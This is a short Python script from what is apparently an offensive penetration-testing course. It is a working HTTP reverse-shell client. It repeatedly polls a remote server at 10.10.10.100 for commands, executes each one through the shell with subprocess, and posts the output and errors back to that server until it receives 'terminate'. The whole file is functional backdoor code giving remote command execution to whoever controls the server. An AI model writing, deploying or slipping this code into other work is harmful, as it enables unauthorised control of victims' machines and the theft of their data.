# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


#Basic HTTP client


import requests     # Download Link    https://pypi.python.org/pypi/requests#downloads , just extract the rar file and follow the video :)
import subprocess 
import time


while True: 

    req = requests.get('http://10.10.10.100')      # Send GET request to our kali server
    command = req.text                             # Store the received txt into command variable
        
    if 'terminate' in command:
        break 

    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stdout.read() )  # POST the result 
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read() )  # or the error -if any-

    time.sleep(3)
    



